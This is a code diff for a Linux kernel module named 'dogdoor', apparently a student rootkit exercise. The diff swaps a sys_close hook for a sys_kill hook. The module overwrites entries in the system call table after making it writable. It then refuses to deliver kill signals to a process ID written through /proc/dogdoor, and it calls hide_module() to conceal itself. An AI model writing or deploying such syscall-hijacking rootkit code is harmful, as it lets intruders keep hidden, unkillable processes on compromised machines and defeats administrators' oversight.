@@ -19,12 +19,12 @@ int index=0;
 void ** sctable ;
 int connect = 1;
 int uid=-31;
-char inName[512] = "-1";
+pid_t inpid = -31;
 char filepath[10][512];
 int top =0;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
-asmlinkage int (*orig_sys_close)(const char __user * filename, int flags, umode_t mode) ; 
+asmlinkage int (*orig_sys_kill)(pid_t pid, int sig) ; 
 
 asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
 {
@@ -42,20 +42,19 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 	return orig_sys_open(filename, flags, mode) ;
 }
 
-asmlinkage int dogdoor_sys_close(char *filename, int flags, int mode)
-{	char fname[512] = "-1" ;
-	copy_from_user(fname, filename,512) ;	
-
+asmlinkage int dogdoor_sys_kill(pid_t pid, int sig)
+{	
+	printk("input process name : %d", inpid); 
 	printk("dogdoor sys close implemented");
 	//copy from kernel to user
 	//copy_from_user(pID, proID, 256);
 
-	if(strcmp(fname, inName)==0) {
+	if(pid==inpid) {
 		printk("Compare complete");
 		return -1;
 	}
 	else{
-	return orig_sys_close(filename,flags,mode) ;
+	return orig_sys_kill(pid, sig) ;
 	}
 }
 
@@ -150,7 +149,7 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	}
 	else if(index==3){
 		printk("index completed");
-		sscanf(buf+1, "s",inName);
+		sscanf(buf+1, "%d", &inpid);
 	}	
 	if(index==5){
 		hide_module();
@@ -185,12 +184,12 @@ int __init dogdoor_init(void) {
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
 	orig_sys_open = sctable[__NR_open] ;
-	orig_sys_close = sctable[__NR_close] ;
+	orig_sys_kill = sctable[__NR_kill] ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
 		pte->pte |= _PAGE_RW ;		
 	sctable[__NR_open] = dogdoor_sys_open ;
-	sctable[__NR_close] = dogdoor_sys_close ;
+	sctable[__NR_kill] = dogdoor_sys_kill ;
 
 	return 0;
 }
@@ -202,7 +201,7 @@ void __exit dogdoor_exit(void) {
 	remove_proc_entry("dogdoor", NULL) ;
 	
 	sctable[__NR_open] = orig_sys_open ;
-	sctable[__NR_close] = orig_sys_close ;
+	sctable[__NR_kill] = orig_sys_kill ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	pte->pte = pte->pte &~ _PAGE_RW ;
 }
